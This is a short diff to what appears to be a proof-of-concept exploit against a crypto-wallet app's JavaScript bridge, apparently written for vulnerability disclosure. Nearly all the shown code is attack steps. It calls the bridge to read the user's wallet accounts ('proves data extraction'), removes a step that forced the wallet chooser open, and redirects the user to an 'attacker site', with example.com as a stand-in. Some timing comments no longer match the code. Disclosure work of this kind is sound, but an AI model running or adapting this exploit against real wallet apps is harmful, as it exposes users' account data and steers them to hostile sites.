@@ -77,17 +77,12 @@
 			// 2. Get wallet accounts (4s) — proves data extraction
 			setTimeout(function () {
 				call("ethProviderRequestV2", wireRaw({ jsonrpc: "2.0", id: 1, method: "eth_accounts", params: [] }));
-			}, 3000);
-
-			// 3. Trigger wallet chooser (6s) — proves wallet access
-			setTimeout(function () {
-				call("ethProviderRequestV2", wireRaw({ jsonrpc: "2.0", id: 2, method: "eth_requestAccounts", params: [] }));
 			}, 4000);
 
 			// 4. Redirect user to attacker site (10s) — proves open redirect
 			setTimeout(function () {
 				call("openUrl", wireRaw("https://example.com"));
-			}, 60000);
+			}, 70000);
 
 			setTimeout(function () {
 				call(
